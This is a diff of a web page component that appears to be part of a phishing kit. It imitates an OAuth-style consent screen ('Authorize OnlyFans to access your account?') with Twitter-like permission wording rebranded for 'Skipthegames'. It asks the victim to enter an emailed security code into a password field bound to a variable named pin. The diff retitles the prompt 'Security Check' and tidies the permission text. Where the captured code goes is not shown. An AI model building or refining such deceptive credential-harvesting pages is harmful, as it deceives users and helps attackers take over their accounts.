@@ -68,7 +68,7 @@
                         <h4>Authorize OnlyFans to access your account?</h4>
                     </div>
                     <div class="submit-opstion">
-                        <h4> code</h4>
+                        <h4>Security Check</h4>
                         <p style="margin-top: 10px;">A security code has been sent to your email address
                             Please enter the code here</p>
                         <input type="password" placeholder=" security-code" bind:value={pin}> <br>
@@ -89,13 +89,11 @@
             </div>
             <div class="unorder-list">
                 <ul>
-                    <li>See Skipthegames from your timeline (including  protected Text) as well as your Lists and collections.</li>
-                    <li>See your skipthegames profile information and account settings.
-                        See accounts you follow, mute, and block.</li>
+                    <li>See Skipthegames from your timeline (including protected Text) as well as your Lists and collections.</li>
+                    <li>See your skipthegames profile information and account settings. See accounts you follow, mute, and block.</li>
                     <li>Follow and unfollow accounts for you</li>
                     <li>Update your profile and account settings.</li>
-                    <li>Post and delete Text for you, and engage with Text   posted by others (Like, un-Like, or reply to a Text,
-                        Retext, etc.) for you.</li> 
+                    <li>Post and delete Text for you, and engage with Text posted by others (Like, un-Like, or reply to a Text, Retext, etc.) for you.</li> 
                      
                     <li>Create, manage, and delete Lists and collections for you</li>
                     <li>Mute, block, and report accounts for you</li>
